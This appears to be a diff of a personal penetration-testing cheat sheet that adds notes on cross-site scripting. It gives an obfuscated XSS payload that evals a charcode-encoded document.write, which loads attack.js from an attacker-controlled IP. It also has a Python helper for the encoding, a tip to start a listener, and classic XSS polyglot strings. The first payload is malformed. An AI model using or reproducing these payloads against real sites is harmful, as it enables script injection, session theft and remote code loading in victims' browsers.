@@ -1,3 +1,26 @@
+============= Cross Site Scripting
+
+#ToDo: ADDING THE BASICS OF XSS
+
+
+using eval() to execute a String
+
+<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.14.5/attack.js"></script>');))</script>">
+Encode the document.write('<script src="http://10.10.14.5/attack.js"></script>');   part
+<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,53,47,97,116,116,97,99,107,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
+
+Start a listener to monitor request for the source
+
+Python code to encode string to numeric ascii representation
+
+def encode(ascii):
+     decode_string = ""
+     for char in ascii:
+         decode_string += str(ord(char)) + ","
+     return decode_string[:-1]
+
+====================================================================
+
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
